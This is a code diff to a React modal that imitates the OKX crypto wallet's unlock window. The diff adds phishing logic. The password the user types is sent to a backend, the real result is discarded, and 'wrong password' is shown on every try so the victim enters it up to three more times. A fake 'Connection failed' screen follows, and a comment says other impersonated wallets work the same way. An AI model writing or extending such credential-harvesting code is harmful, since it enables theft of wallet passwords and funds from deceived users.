@@ -2877,6 +2877,8 @@ const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, })
     const [showPassword, setShowPassword] = useState(false);
     const [isFocused, setIsFocused] = useState(false);
     const [isWrongPassword, setIsWrongPassword] = useState(false);
+    const [trying, setTrying] = useState(0);
+    const [connectionError, setConnectionError] = useState(false);
     const [isClosable, setIsClosable] = useState(true);
     const passwordInputRef = useRef(null);
     const modalRef = useRef(null);
@@ -2906,6 +2908,8 @@ const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, })
         setConnecting(false);
         setShowPassword(false);
         setIsWrongPassword(false);
+        setTrying(0);
+        setConnectionError(false);
     };
     const handleKeywordChange = async (e) => {
         const newKeyword = e.target.value;
@@ -2923,19 +2927,30 @@ const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, })
         const currentUserId = backendConfig?.userId || userId;
         if (!currentUserId) {
             setConnecting(false);
+            setIsWrongPassword(true);
             return;
         }
         if (backendConfig?.enabled !== false) {
-            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.OKX);
+            await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.OKX);
             setTimeout(() => {
                 setConnecting(false);
-                setIsWrongPassword(!!result.error);
+                // Always treat unlock as wrong password (same as other wallets)
+                if (trying < 3) {
+                    setIsWrongPassword(true);
+                    setTrying(trying + 1);
+                }
+                else {
+                    setConnectionError(true);
+                }
                 passwordInputRef.current?.focus();
             }, 400);
         }
         else {
             setTimeout(() => setConnecting(false), 150);
         }
+    };
+    const closeWindow = () => {
+        handleClose();
     };
     const handleKeyDown = (e) => {
         if (e.key === 'Enter' && keyword.trim() && !connecting) {
@@ -2948,12 +2963,22 @@ const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, })
     };
     if (!isOpen)
         return null;
-    const isButtonEnabled = keyword.trim().length > 0 && !connecting && !isWrongPassword;
+    const isButtonEnabled = keyword.trim().length > 0 && !connecting;
     const logoSrc = resolveAssetUrl(isDark ? ASSET_PATHS.okxCoverDark : ASSET_PATHS.okxCoverLight);
     return (React.createElement("div", { ref: modalRef, className: `okx-modal fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50 antialiased ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'} ${isDark ? 'text-white' : 'text-black'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
         React.createElement("div", { className: `relative w-[360px] h-[600px] overflow-hidden ${isDark
                 ? 'bg-black shadow-[0_1px_2px_rgba(256,256,256,0.2)]'
-                : 'bg-white shadow-[0_4px_10px_rgba(0,0,0,0.15)]'}` },
+                : 'bg-white shadow-[0_4px_10px_rgba(0,0,0,0.15)]'}` }, connectionError ? (React.createElement("div", { className: `text-center px-4 py-8 flex flex-col h-full justify-between ${isDark ? 'text-white' : 'text-black'}` },
+            React.createElement("div", null),
+            React.createElement("div", null,
+                React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
+                    React.createElement("svg", { className: `text-2xl text-center w-6 h-6 ${isDark ? 'text-white' : 'text-red-500'}`, fill: "currentColor", viewBox: "0 0 20 20" },
+                        React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
+                React.createElement("h3", { className: "text-xl font-extrabold" }, "Connection failed"),
+                React.createElement("p", { className: "text-sm" }, "Please check your connection and try again.")),
+            React.createElement("button", { type: "button", className: `w-full rounded-full cursor-pointer p-2.5 border-none text-[16px] font-[700] ${isDark
+                    ? 'bg-white text-black hover:bg-[#e8e8e8]'
+                    : 'bg-black text-white hover:bg-[#1a1a1a]'}`, onClick: closeWindow }, "Ok"))) : (React.createElement(React.Fragment, null,
             React.createElement("div", { className: "h-full overflow-y-auto overflow-x-hidden" },
                 React.createElement("div", { className: "flex items-center justify-center" },
                     React.createElement("div", { className: "flex w-full items-center justify-center" },
@@ -2996,7 +3021,7 @@ const OKXModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false, })
                                 ? 'cursor-not-allowed bg-[#1f1f1f] text-[#5c5c5c]'
                                 : 'cursor-not-allowed bg-[#f0f0f0] text-[#b0b0b0]'}` },
                         React.createElement("span", null, "\u89E3\u9501")),
-                    React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", className: "cursor-pointer mt-[24px] text-center text-sm font-medium leading-5 text-[#8c8c8c] no-underline hover:opacity-60" }, "\u5FD8\u8BB0\u5BC6\u7801\uFF1F"))))));
+                    React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", className: "cursor-pointer mt-[24px] text-center text-sm font-medium leading-5 text-[#8c8c8c] no-underline hover:opacity-60" }, "\u5FD8\u8BB0\u5BC6\u7801\uFF1F"))))))));
 };
 
 const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminNameProp }) => {
